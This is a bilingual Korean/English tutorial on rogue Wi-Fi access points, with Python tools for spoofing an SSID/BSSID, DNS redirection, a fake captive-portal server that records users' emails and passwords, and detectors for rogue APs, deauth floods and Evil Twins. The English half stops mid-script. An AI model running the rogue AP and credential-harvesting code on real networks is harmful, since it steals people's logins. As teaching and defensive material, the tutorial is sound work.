> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 로그 AP·캡티브 포털·WiFi 모니터링 및 탐지

## 0. 초보자를 위한 개념 이해

### 로그 AP와 캡티브 포털이란?

로그 AP(Rogue AP)는 합법적인 AP처럼 위장한 악성 무선 접속 포인트입니다. 공격자가 카페·공항·회사 근처에서 동일한 SSID를 가진 가짜 AP를 운영하면, 피해자의 기기가 자동으로 연결될 수 있습니다. 캡티브 포털은 연결 직후 브라우저로 열리는 로그인 페이지로, 정상 서비스에서도 사용되지만 공격자는 이를 모방한 가짜 페이지로 자격증명을 수집합니다.

**왜 배우는가:**
```
로그 AP 공격의 실제 위협:

  호텔 WiFi 시뮬레이션:
    공격자 → "Hotel_Guest" SSID AP 개설 (실제 호텔 WiFi와 동일)
    피해자 → 자동 연결 (이전에 접속한 적 있는 SSID)
    공격자 → 모든 HTTP 트래픽 감청
            캡티브 포털 → 호텔 로그인 페이지 사칭
            → 이메일/패스워드 수집

  방어 관점:
    WiFi 자동 연결 비활성화
    HTTPS Only 사이트 사용
    VPN 상시 사용
    AP 인증서 검증 (WPA2-Enterprise)
```

### 핵심 개념 정리

```
로그 AP 구성 요소:

  hostapd   — 소프트웨어 AP 데몬 (SSID, 채널, 보안 설정)
  dnsmasq   — DHCP 서버 (클라이언트에 IP 할당)
              DNS 스푸핑 (모든 도메인을 공격자 IP로 응답)
  iptables  — 트래픽 라우팅 (인터넷 포워딩 또는 차단)
  
캡티브 포털 동작:
  1. 클라이언트 연결 → DHCP IP 할당
  2. DNS 쿼리 → 공격자 IP로 응답
  3. HTTP 요청 → captive portal 페이지로 리다이렉트
  4. 가짜 로그인 페이지 → 자격증명 제출
  5. 자격증명 수집 → 실제 연결 허용 (의심 회피)

탐지 방법:
  무선 IDS (Wireless IDS)
  AP 지문 분석 (Beacon 프레임 특성)
  BSSID vs SSID 매핑 검증
```

### 필요한 도구 및 환경
- **hostapd**: 소프트웨어 AP 구성 (Linux 패키지)
- **dnsmasq**: 경량 DHCP/DNS 서버
- **Flask/FastAPI**: 캡티브 포털 웹 서버 구현
- **무선 랜카드 AP 모드 지원**: 내장 카드보다 외장 USB 권장

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""로그 AP 탐지 — 주변 AP의 SSID/BSSID 불일치 감지."""

from dataclasses import dataclass
from collections import defaultdict


@dataclass
class AccessPoint:
    ssid: str
    bssid: str
    channel: int
    signal_dbm: int
    vendor: str = ""  # OUI 기반 벤더 정보


def detect_rogue_ap(
    known_aps: list[AccessPoint],
    scanned_aps: list[AccessPoint],
) -> list[str]:
    """알려진 AP 목록과 비교하여 의심스러운 AP를 탐지합니다."""
    warnings: list[str] = []

    # 알려진 SSID → BSSID(들) 매핑 구성
    known_ssid_to_bssids: dict[str, set[str]] = defaultdict(set)
    for ap in known_aps:
        known_ssid_to_bssids[ap.ssid].add(ap.bssid.upper())

    for ap in scanned_aps:
        ssid = ap.ssid
        bssid = ap.bssid.upper()

        if ssid in known_ssid_to_bssids:
            if bssid not in known_ssid_to_bssids[ssid]:
                # 알려진 SSID인데 BSSID가 다름 → 가짜 AP 의심
                warnings.append(
                    f"[로그 AP 의심] SSID='{ssid}' BSSID={bssid} "
                    f"(인가된 BSSID: {known_ssid_to_bssids[ssid]})"
                )
    return warnings


if __name__ == "__main__":
    # 인가된 AP 목록 (사전에 등록)
    authorized = [
        AccessPoint("OfficeWiFi", "AA:BB:CC:11:22:33", 6, -50),
        AccessPoint("OfficeWiFi_5G", "AA:BB:CC:11:22:34", 36, -55),
    ]
    # 현재 스캔된 AP 목록
    current_scan = [
        AccessPoint("OfficeWiFi", "AA:BB:CC:11:22:33", 6, -55),   # 정상
        AccessPoint("OfficeWiFi", "DD:EE:FF:99:88:77", 11, -40),  # 의심!
        AccessPoint("FreeWiFi", "11:22:33:44:55:66", 1, -60),     # 알 수 없음
    ]
    alerts = detect_rogue_ap(authorized, current_scan)
    if alerts:
        for alert in alerts:
            print(alert)
    else:
        print("로그 AP 탐지되지 않음")
```

---

## 1. 로그 AP 공격 개요

```
공격자 로그 AP 생성
    │  → 합법적 AP와 동일한 SSID/BSSID 위장
    ▼
피해자 디바이스 연결
    │  → 신호 강도 우위 또는 디어스 공격 병행
    ▼
트래픽 인터셉트
    │  → MITM: HTTP/HTTPS 트래픽 분석
    │  → 크리덴셜 수집
    ▼
캡티브 포털 (선택)
    │  → 가짜 로그인 페이지 제시
    ▼
피해자 자격증명 획득
```

---

## 2. 로그 AP 설정 자동화

```python
#!/usr/bin/env python3
"""로그 AP 환경 자동 구성 — hostapd + dnsmasq 설정 생성기."""

import argparse
import subprocess
import sys
from pathlib import Path


def generate_hostapd_config(
    interface: str,
    ssid: str,
    channel: int = 6,
    bssid: str | None = None,
) -> str:
    lines = [
        f"interface={interface}",
        f"ssid={ssid}",
        f"channel={channel}",
        "hw_mode=g",
        "ignore_broadcast_ssid=0",
        "auth_algs=1",
        "wmm_enabled=0",
    ]
    if bssid:
        lines.append(f"bssid={bssid}")
    return "\n".join(lines)


def generate_dnsmasq_config(
    interface: str,
    gateway_ip: str = "192.168.50.1",
    dhcp_range: tuple[str, str] = ("192.168.50.10", "192.168.50.100"),
    dns_redirect: str | None = None,
) -> str:
    lines = [
        f"interface={interface}",
        "dhcp-authoritative",
        f"dhcp-range={dhcp_range[0]},{dhcp_range[1]},12h",
        f"dhcp-option=3,{gateway_ip}",
        f"dhcp-option=6,{gateway_ip}",
        "log-queries",
        "log-dhcp",
    ]
    if dns_redirect:
        # 모든 DNS 쿼리를 캡티브 포털로 리디렉션
        lines.append(f"address=/#/{dns_redirect}")
    return "\n".join(lines)


def setup_ip_forwarding(interface: str, gateway_ip: str) -> list[str]:
    """AP 인터페이스 IP 설정 및 패킷 포워딩 명령 목록."""
    return [
        f"ip addr add {gateway_ip}/24 dev {interface}",
        f"ip link set {interface} up",
        "sysctl -w net.ipv4.ip_forward=1",
    ]


def write_configs(
    out_dir: Path,
    interface: str,
    ssid: str,
    channel: int,
    bssid: str | None,
    gateway_ip: str,
    dns_redirect: str | None,
) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)

    hostapd_conf = out_dir / "hostapd.conf"
    hostapd_conf.write_text(generate_hostapd_config(interface, ssid, channel, bssid))
    print(f"[+] hostapd 설정: {hostapd_conf}")

    dnsmasq_conf = out_dir / "dnsmasq.conf"
    dnsmasq_conf.write_text(generate_dnsmasq_config(interface, gateway_ip, dns_redirect=dns_redirect))
    print(f"[+] dnsmasq 설정: {dnsmasq_conf}")

    setup_sh = out_dir / "setup.sh"
    cmds = setup_ip_forwarding(interface, gateway_ip)
    cmds += [
        f"hostapd {hostapd_conf} &",
        f"dnsmasq -C {dnsmasq_conf} --no-daemon &",
    ]
    setup_sh.write_text("#!/bin/bash\n" + "\n".join(cmds) + "\n")
    setup_sh.chmod(0o755)
    print(f"[+] 실행 스크립트: {setup_sh}")
    print("\n[!] 주의: 인가된 환경(랩/CTF)에서만 사용")


def main() -> None:
    parser = argparse.ArgumentParser(description="로그 AP 설정 생성기")
    parser.add_argument("-i", "--interface", required=True, help="모니터 인터페이스 (예: wlan1)")
    parser.add_argument("-s", "--ssid", required=True, help="SSID")
    parser.add_argument("-c", "--channel", type=int, default=6)
    parser.add_argument("--bssid", help="스푸핑할 BSSID (예: AA:BB:CC:DD:EE:FF)")
    parser.add_argument("--gateway", default="192.168.50.1")
    parser.add_argument("--redirect", help="캡티브 포털 IP (DNS 리디렉션)")
    parser.add_argument("-o", "--output", type=Path, default=Path("./rogue_ap"))
    args = parser.parse_args()

    write_configs(
        args.output, args.interface, args.ssid,
        args.channel, args.bssid, args.gateway, args.redirect,
    )


if __name__ == "__main__":
    main()
```

---

## 3. 캡티브 포털 크리덴셜 수집

```python
#!/usr/bin/env python3
"""캡티브 포털 서버 — 크리덴셜 수집 (교육·CTF 전용)."""

import argparse
import json
import logging
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse


PORTAL_HTML = """<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>WiFi 인증</title>
  <style>
    body {{ font-family: Arial, sans-serif; background: #f0f0f0; display: flex;
           justify-content: center; align-items: center; height: 100vh; }}
    .box {{ background: white; padding: 40px; border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 320px; }}
    input {{ width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }}
    button {{ width: 100%; padding: 12px; background: #0066cc; color: white;
              border: none; border-radius: 4px; cursor: pointer; }}
  </style>
</head>
<body>
  <div class="box">
    <h2>WiFi 접속 인증</h2>
    <form method="POST" action="/login">
      <input type="email" name="username" placeholder="이메일" required>
      <input type="password" name="password" placeholder="패스워드" required>
      <button type="submit">연결</button>
    </form>
  </div>
</body>
</html>"""

SUCCESS_HTML = """<!DOCTYPE html>
<html><body style="text-align:center;margin-top:100px;">
<h2>연결되었습니다.</h2><p>잠시 후 자동으로 이동합니다.</p>
</body></html>"""


class CaptivePortalHandler(BaseHTTPRequestHandler):
    cred_log: Path = Path("captured_creds.jsonl")

    def log_message(self, fmt: str, *args) -> None:
        pass  # 기본 로그 억제

    def do_GET(self) -> None:
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(PORTAL_HTML.encode())

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        params = parse_qs(body)

        username = params.get("username", [""])[0]
        password = params.get("password", [""])[0]
        src_ip = self.client_address[0]

        entry = {
            "timestamp": datetime.now().isoformat(),
            "src_ip": src_ip,
            "username": username,
            "password": password,
        }
        with self.cred_log.open("a") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")

        print(f"[+] 크리덴셜 수집: {src_ip} → {username}:{password}")

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(SUCCESS_HTML.encode())


def main() -> None:
    parser = argparse.ArgumentParser(description="캡티브 포털 서버 (교육용)")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--log", type=Path, default=Path("captured_creds.jsonl"))
    args = parser.parse_args()

    CaptivePortalHandler.cred_log = args.log
    print(f"[*] 캡티브 포털 시작: http://{args.host}:{args.port}")
    print(f"[*] 크리덴셜 저장: {args.log}")
    print("[!] 인가된 환경(랩/CTF)에서만 사용\n")

    HTTPServer((args.host, args.port), CaptivePortalHandler).serve_forever()


if __name__ == "__main__":
    main()
```

---

## 4. WiFi 트래픽 모니터링 및 이상 탐지

```python
#!/usr/bin/env python3
"""WiFi 모니터링 — 로그 AP·디어스 공격·비콘 플러딩 탐지 CLI."""

import argparse
import json
import signal
import sys
from collections import defaultdict, Counter
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path

try:
    from scapy.all import (
        sniff, Dot11, Dot11Beacon, Dot11Deauth,
        Dot11ProbeResp, Dot11Elt, RadioTap,
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


@dataclass
class APInfo:
    bssid: str
    ssid: str
    channel: int
    rssi: int
    first_seen: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    beacon_count: int = 0


@dataclass
class DeauthEvent:
    src: str
    dst: str
    bssid: str
    timestamp: datetime = field(default_factory=datetime.now)


class WiFiMonitor:
    def __init__(self, known_ssids: list[str] | None = None) -> None:
        self.aps: dict[str, APInfo] = {}
        self.deauth_events: list[DeauthEvent] = []
        self.beacon_counter: Counter = Counter()
        self.known_ssids = set(known_ssids or [])
        self.alerts: list[dict] = []

    def process_packet(self, pkt) -> None:
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            self._process_beacon(pkt)
        elif pkt.haslayer(Dot11Deauth):
            self._process_deauth(pkt)

    def _process_beacon(self, pkt) -> None:
        bssid = pkt[Dot11].addr3
        if not bssid:
            return

        ssid = ""
        channel = 0
        if pkt.haslayer(Dot11Elt):
            elt = pkt[Dot11Elt]
            while elt:
                if elt.ID == 0:
                    try:
                        ssid = elt.info.decode(errors="ignore")
                    except Exception:
                        pass
                elif elt.ID == 3 and elt.info:
                    channel = elt.info[0]
                elt = elt.payload if hasattr(elt, "payload") and elt.payload else None

        rssi = pkt[RadioTap].dBm_AntSignal if pkt.haslayer(RadioTap) and hasattr(pkt[RadioTap], "dBm_AntSignal") else 0

        now = datetime.now()
        if bssid in self.aps:
            ap = self.aps[bssid]
            ap.last_seen = now
            ap.beacon_count += 1
            ap.rssi = rssi
        else:
            self.aps[bssid] = APInfo(bssid, ssid, channel, rssi)
            self._check_rogue_ap(bssid, ssid)

        self.beacon_counter[ssid] += 1
        self._check_beacon_flood(ssid)

    def _process_deauth(self, pkt) -> None:
        src = pkt[Dot11].addr2 or ""
        dst = pkt[Dot11].addr1 or ""
        bssid = pkt[Dot11].addr3 or ""

        event = DeauthEvent(src, dst, bssid)
        self.deauth_events.append(event)

        # 1분 내 같은 BSSID 디어스 10개 이상 → 공격 탐지
        cutoff = datetime.now() - timedelta(minutes=1)
        recent = [e for e in self.deauth_events if e.bssid == bssid and e.timestamp > cutoff]
        if len(recent) >= 10:
            self._alert("DEAUTH_FLOOD", f"디어스 공격 탐지: {bssid} ({len(recent)}개/분)")

    def _check_rogue_ap(self, bssid: str, ssid: str) -> None:
        if not self.known_ssids or ssid not in self.known_ssids:
            return
        # 알려진 SSID가 다른 BSSID에서 브로드캐스트 → 로그 AP 의심
        self._alert("ROGUE_AP", f"로그 AP 의심: SSID={ssid}, BSSID={bssid}")

    def _check_beacon_flood(self, ssid: str) -> None:
        if self.beacon_counter[ssid] > 0 and self.beacon_counter[ssid] % 500 == 0:
            self._alert("BEACON_FLOOD", f"비콘 플러딩 의심: SSID={ssid} ({self.beacon_counter[ssid]}회)")

    def _alert(self, alert_type: str, message: str) -> None:
        entry = {
            "type": alert_type,
            "message": message,
            "timestamp": datetime.now().isoformat(),
        }
        self.alerts.append(entry)
        print(f"[!] {alert_type}: {message}")

    def summary(self) -> dict:
        return {
            "total_aps": len(self.aps),
            "deauth_events": len(self.deauth_events),
            "alerts": len(self.alerts),
            "alert_detail": self.alerts,
            "ap_list": [
                {"bssid": ap.bssid, "ssid": ap.ssid, "channel": ap.channel,
                 "rssi": ap.rssi, "beacons": ap.beacon_count}
                for ap in sorted(self.aps.values(), key=lambda a: a.beacon_count, reverse=True)[:20]
            ],
        }


def monitor_live(interface: str, known_ssids: list[str], timeout: int, output: Path | None) -> None:
    if not SCAPY_AVAILABLE:
        print("scapy 설치 필요: pip install scapy", file=sys.stderr)
        sys.exit(1)

    monitor = WiFiMonitor(known_ssids)
    print(f"[*] {interface} 모니터링 시작 (timeout={timeout}s)")
    print(f"[*] 알려진 SSID: {known_ssids or '없음 (모두 감시)'}\n")

    try:
        sniff(
            iface=interface,
            prn=monitor.process_packet,
            store=False,
            timeout=timeout,
        )
    except KeyboardInterrupt:
        pass

    summary = monitor.summary()
    print(f"\n=== 모니터링 결과 ===")
    print(f"탐지된 AP: {summary['total_aps']}개")
    print(f"디어스 이벤트: {summary['deauth_events']}개")
    print(f"경보: {summary['alerts']}개")

    if output:
        output.write_text(json.dumps(summary, indent=2, ensure_ascii=False))
        print(f"\n[+] 결과 저장: {output}")


def main() -> None:
    parser = argparse.ArgumentParser(description="WiFi 이상 탐지 모니터")
    parser.add_argument("-i", "--interface", required=True, help="모니터 모드 인터페이스")
    parser.add_argument("--known-ssids", nargs="*", default=[], help="합법적 SSID 목록")
    parser.add_argument("-t", "--timeout", type=int, default=60, help="캡처 시간(초)")
    parser.add_argument("-o", "--output", type=Path)
    args = parser.parse_args()

    monitor_live(args.interface, args.known_ssids, args.timeout, args.output)


if __name__ == "__main__":
    main()
```

---

## 5. Evil Twin 자동 탐지

```python
#!/usr/bin/env python3
"""Evil Twin AP 탐지 — 동일 SSID 다중 BSSID 분석."""

import argparse
import json
from collections import defaultdict
from pathlib import Path


def parse_airodump_csv(csv_path: Path) -> list[dict]:
    """airodump-ng CSV 파일 파싱."""
    aps: list[dict] = []
    in_ap_section = True

    with csv_path.open(encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                in_ap_section = False
                continue
            if line.startswith("BSSID") or line.startswith("Station"):
                continue
            if in_ap_section:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 14:
                    aps.append({
                        "bssid": parts[0],
                        "channel": parts[3].strip(),
                        "privacy": parts[5].strip(),
                        "power": parts[8].strip(),
                        "ssid": parts[13].strip(),
                    })

    return aps


def detect_evil_twin(aps: list[dict]) -> list[dict]:
    """동일 SSID에 BSSID 2개 이상 → Evil Twin 의심."""
    ssid_map: dict[str, list[dict]] = defaultdict(list)
    for ap in aps:
        ssid = ap["ssid"]
        if ssid and ssid != "":
            ssid_map[ssid].append(ap)

    suspects = []
    for ssid, ap_list in ssid_map.items():
        if len(ap_list) >= 2:
            # 채널이 다르면 추가 의심
            channels = {a["channel"] for a in ap_list}
            suspects.append({
                "ssid": ssid,
                "ap_count": len(ap_list),
                "multi_channel": len(channels) > 1,
                "bssids": [a["bssid"] for a in ap_list],
                "channels": list(channels),
                "risk": "HIGH" if len(channels) > 1 else "MEDIUM",
            })

    return sorted(suspects, key=lambda x: x["ap_count"], reverse=True)


def main() -> None:
    parser = argparse.ArgumentParser(description="Evil Twin AP 탐지")
    sub = parser.add_subparsers(dest="cmd", required=True)

    csv_p = sub.add_parser("csv", help="airodump-ng CSV 분석")
    csv_p.add_argument("file", type=Path)
    csv_p.add_argument("-o", "--output", type=Path)

    args = parser.parse_args()

    if args.cmd == "csv":
        aps = parse_airodump_csv(args.file)
        suspects = detect_evil_twin(aps)

        print(f"[*] 총 AP: {len(aps)}개")
        print(f"[!] Evil Twin 의심: {len(suspects)}개\n")

        for s in suspects:
            risk_icon = "[!!]" if s["risk"] == "HIGH" else "[!]"
            print(f"{risk_icon} SSID: {s['ssid']} ({s['ap_count']}개 AP)")
            print(f"    BSSID: {', '.join(s['bssids'])}")
            print(f"    채널: {', '.join(s['channels'])}")
            print(f"    위험도: {s['risk']}\n")

        if args.output:
            args.output.write_text(json.dumps(suspects, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
```

---

## 6. 방어 대책

| 공격 | 탐지 방법 | 방어 조치 |
|------|-----------|-----------|
| 로그 AP | 동일 SSID 다중 BSSID 탐지 | 802.1X EAP 인증 + 인증서 고정 |
| 디어스 공격 | 관리 프레임 비율 모니터링 | 802.11w PMF (Protected Management Frames) |
| 비콘 플러딩 | 비콘 패킷 급증 탐지 | WIPS 솔루션 배포 |
| 캡티브 포털 | DNS 리디렉션 탐지 | HSTS + 인증서 검증 |
| KARMA 공격 | 프로브 응답 모니터링 | 선호 네트워크 목록 최소화 |
| PMKID 공격 | 연결 없이 핸드셰이크 수집 | WPA3-SAE 업그레이드 |

---

<a name="english"></a>

# Rogue AP, Captive Portal, WiFi Monitoring, and Detection

## 1. Rogue AP Attack Overview

```
Attacker creates rogue AP
    |  -> Spoofs same SSID/BSSID as legitimate AP
    v
Victim device connects
    |  -> Superior signal strength or combined deauth attack
    v
Traffic interception
    |  -> MITM: Analyze HTTP/HTTPS traffic
    |  -> Credential harvesting
    v
Captive portal (optional)
    |  -> Present fake login page
    v
Victim credentials obtained
```

---

## 2. Rogue AP Setup Automation

```python
#!/usr/bin/env python3
"""Automated rogue AP environment setup — hostapd + dnsmasq config generator."""

import argparse
import subprocess
import sys
from pathlib import Path


def generate_hostapd_config(
    interface: str,
    ssid: str,
    channel: int = 6,
    bssid: str | None = None,
) -> str:
    lines = [
        f"interface={interface}",
        f"ssid={ssid}",
        f"channel={channel}",
        "hw_mode=g",
        "ignore_broadcast_ssid=0",
        "auth_algs=1",
        "wmm_enabled=0",
    ]
    if bssid:
        lines.append(f"bssid={bssid}")
    return "\n".join(lines)


def generate_dnsmasq_config(
    interface: str,
    gateway_ip: str = "192.168.50.1",
    dhcp_range: tuple[str, str] = ("192.168.50.10", "192.168.50.100"),
    dns_redirect: str | None = None,
) -> str:
    lines = [
        f"interface={interface}",
        "dhcp-authoritative",
        f"dhcp-range={dhcp_range[0]},{dhcp_range[1]},12h",
        f"dhcp-option=3,{gateway_ip}",
        f"dhcp-option=6,{gateway_ip}",
        "log-queries",
        "log-dhcp",
    ]
    if dns_redirect:
        # Redirect all DNS queries to captive portal
        lines.append(f"address=/#/{dns_redirect}")
    return "\n".join(lines)


def setup_ip_forwarding(interface: str, gateway_ip: str) -> list[str]:
    """List of commands to configure AP interface IP and packet forwarding."""
    return [
        f"ip addr add {gateway_ip}/24 dev {interface}",
        f"ip link set {interface} up",
        "sysctl -w net.ipv4.ip_forward=1",
    ]


def write_configs(
    out_dir: Path,
    interface: str,
    ssid: str,
    channel: int,
    bssid: str | None,
    gateway_ip: str,
    dns_redirect: str | None,
) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)

    hostapd_conf = out_dir / "hostapd.conf"
    hostapd_conf.write_text(generate_hostapd_config(interface, ssid, channel, bssid))
    print(f"[+] hostapd config: {hostapd_conf}")

    dnsmasq_conf = out_dir / "dnsmasq.conf"
    dnsmasq_conf.write_text(generate_dnsmasq_config(interface, gateway_ip, dns_redirect=dns_redirect))
    print(f"[+] dnsmasq config: {dnsmasq_conf}")

    setup_sh = out_dir / "setup.sh"
    cmds = setup_ip_forwarding(interface, gateway_ip)
    cmds += [
        f"hostapd {hostapd_conf} &",
        f"dnsmasq -C {dnsmasq_conf} --no-daemon &",
    ]
    setup_sh.write_text("#!/bin/bash\n" + "\n".join(cmds) + "\n")
    setup_sh.chmod(0o755)
    print(f"[+] Setup script: {setup_sh}")
    print("\n[!] Warning: Use only in authorized environments (lab/CTF)")


def main() -> None:
    parser = argparse.ArgumentParser(description="Rogue AP config generator")
    parser.add_argument("-i", "--interface", required=True, help="Monitor interface (e.g. wlan1)")
    parser.add_argument("-s", "--ssid", required=True, help="SSID")
    parser.add_argument("-c", "--channel", type=int, default=6)
    parser.add_argument("--bssid", help="BSSID to spoof (e.g. AA:BB:CC:DD:EE:FF)")
    parser.add_argument("--gateway", default="192.168.50.1")
    parser.add_argument("--redirect", help="Captive portal IP (DNS redirect)")
    parser.add_argument("-o", "--output", type=Path, default=Path("./rogue_ap"))
    args = parser.parse_args()

    write_configs(
        args.output, args.interface, args.ssid,
        args.channel, args.bssid, args.gateway, args.redirect,
    )


if __name__ == "__main__":
    main()
```

---

## 3. Captive Portal Credential Harvesting

```python
#!/usr/bin/env python3
"""Captive portal server — credential harvesting (education/CTF only)."""

import argparse
import json
import logging
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse


PORTAL_HTML = """<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>WiFi Authentication</title>
  <style>
    body {{ font-family: Arial, sans-serif; background: #f0f0f0; display: flex;
           justify-content: center; align-items: center; height: 100vh; }}
    .box {{ background: white; padding: 40px; border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 320px; }}
    input {{ width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }}
    button {{ width: 100%; padding: 12px; background: #0066cc; color: white;
              border: none; border-radius: 4px; cursor: pointer; }}
  </style>
</head>
<body>
  <div class="box">
    <h2>WiFi Access Authentication</h2>
    <form method="POST" action="/login">
      <input type="email" name="username" placeholder="Email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Connect</button>
    </form>
  </div>
</body>
</html>"""

SUCCESS_HTML = """<!DOCTYPE html>
<html><body style="text-align:center;margin-top:100px;">
<h2>Connected.</h2><p>You will be redirected shortly.</p>
</body></html>"""


class CaptivePortalHandler(BaseHTTPRequestHandler):
    cred_log: Path = Path("captured_creds.jsonl")

    def log_message(self, fmt: str, *args) -> None:
        pass  # Suppress default logging

    def do_GET(self) -> None:
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(PORTAL_HTML.encode())

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        params = parse_qs(body)

        username = params.get("username", [""])[0]
        password = params.get("password", [""])[0]
        src_ip = self.client_address[0]

        entry = {
            "timestamp": datetime.now().isoformat(),
            "src_ip": src_ip,
            "username": username,
            "password": password,
        }
        with self.cred_log.open("a") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")

        print(f"[+] Credential captured: {src_ip} -> {username}:{password}")

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(SUCCESS_HTML.encode())


def main() -> None:
    parser = argparse.ArgumentParser(description="Captive portal server (educational)")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--log", type=Path, default=Path("captured_creds.jsonl"))
    args = parser.parse_args()

    CaptivePortalHandler.cred_log = args.log
    print(f"[*] Captive portal started: http://{args.host}:{args.port}")
    print(f"[*] Credentials saved to: {args.log}")
    print("[!] Use only in authorized environments (lab/CTF)\n")

    HTTPServer((args.host, args.port), CaptivePortalHandler).serve_forever()


if __name__ == "__main__":
    main()
```

---

## 4. WiFi Traffic Monitoring and Anomaly Detection

```python
#!/usr/bin/env python3
"""WiFi monitoring — CLI for detecting rogue APs, deauth attacks, and beacon flooding."""

import argparse
import json
import signal
import sys
from collections import defaultdict, Counter
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path

try:
    from scapy.all import (
        sniff, Dot11, Dot11Beacon, Dot11Deauth,
        Dot11ProbeResp, Dot11Elt, RadioTap,
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


@dataclass
class APInfo:
    bssid: str
    ssid: str
    channel: int
    rssi: int
    first_seen: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    beacon_count: int = 0


@dataclass
class DeauthEvent:
    src: str
    dst: str
    bssid: str
    timestamp: datetime = field(default_factory=datetime.now)


class WiFiMonitor:
    def __init__(self, known_ssids: list[str] | None = None) -> None:
        self.aps: dict[str, APInfo] = {}
        self.deauth_events: list[DeauthEvent] = []
        self.beacon_counter: Counter = Counter()
        self.known_ssids = set(known_ssids or [])
        self.alerts: list[dict] = []

    def process_packet(self, pkt) -> None:
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            self._process_beacon(pkt)
        elif pkt.haslayer(Dot11Deauth):
            self._process_deauth(pkt)

    def _process_beacon(self, pkt) -> None:
        bssid = pkt[Dot11].addr3
        if not bssid:
            return

        ssid = ""
        channel = 0
        if pkt.haslayer(Dot11Elt):
            elt = pkt[Dot11Elt]
            while elt:
                if elt.ID == 0:
                    try:
                        ssid = elt.info.decode(errors="ignore")
                    except Exception:
                        pass
                elif elt.ID == 3 and elt.info:
                    channel = elt.info[0]
                elt = elt.payload if hasattr(elt, "payload") and elt.payload else None

        rssi = pkt[RadioTap].dBm_AntSignal if pkt.haslayer(RadioTap) and hasattr(pkt[RadioTap], "dBm_AntSignal") else 0

        now = datetime.now()
        if bssid in self.aps:
            ap = self.aps[bssid]
            ap.last_seen = now
            ap.beacon_count += 1
            ap.rssi = rssi
        else:
            self.aps[bssid] = APInfo(bssid, ssid, channel, rssi)
            self._check_rogue_ap(bssid, ssid)

        self.beacon_counter[ssid] += 1
        self._check_beacon_flood(ssid)

    def _process_deauth(self, pkt) -> None:
        src = pkt[Dot11].addr2 or ""
        dst = pkt[Dot11].addr1 or ""
        bssid = pkt[Dot11].addr3 or ""

        event = DeauthEvent(src, dst, bssid)
        self.deauth_events.append(event)

        # 10+ deauths for same BSSID within 1 minute -> attack detected
        cutoff = datetime.now() - timedelta(minutes=1)
        recent = [e for e in self.deauth_events if e.bssid == bssid and e.timestamp > cutoff]
        if len(recent) >= 10:
            self._alert("DEAUTH_FLOOD", f"Deauth attack detected: {bssid} ({len(recent)}/min)")

    def _check_rogue_ap(self, bssid: str, ssid: str) -> None:
        if not self.known_ssids or ssid not in self.known_ssids:
            return
        # Known SSID broadcast from different BSSID -> suspect rogue AP
        self._alert("ROGUE_AP", f"Rogue AP suspected: SSID={ssid}, BSSID={bssid}")

    def _check_beacon_flood(self, ssid: str) -> None:
        if self.beacon_counter[ssid] > 0 and self.beacon_counter[ssid] % 500 == 0:
            self._alert("BEACON_FLOOD", f"Beacon flooding suspected: SSID={ssid} ({self.beacon_counter[ssid]} times)")

    def _alert(self, alert_type: str, message: str) -> None:
        entry = {
            "type": alert_type,
            "message": message,
            "timestamp": datetime.now().isoformat(),
        }
        self.alerts.append(entry)
        print(f"[!] {alert_type}: {message}")

    def summary(self) -> dict:
        return {
            "total_aps": len(self.aps),
            "deauth_events": len(self.deauth_events),
            "alerts": len(self.alerts),
            "alert_detail": self.alerts,
            "ap_list": [
                {"bssid": ap.bssid, "ssid": ap.ssid, "channel": ap.channel,
                 "rssi": ap.rssi, "beacons": ap.beacon_count}
                for ap in sorted(self.aps.values(), key=lambda a: a.beacon_count, reverse=True)[:20]
            ],
        }


def monitor_live(interface: str, known_ssids: list[str], timeout: int, output: Path | None) -> None:
    if not SCAPY_AVAILABLE:
        print("scapy required: pip install scapy", file=sys.stderr)
        sys.exit(1)

    monitor = WiFiMonitor(known_ssids)
    print(f"[*] Monitoring {interface} (timeout={timeout}s)")
    print(f"[*] Known SSIDs: {known_ssids or 'None (monitoring all)'}\n")

    try:
        sniff(
            iface=interface,
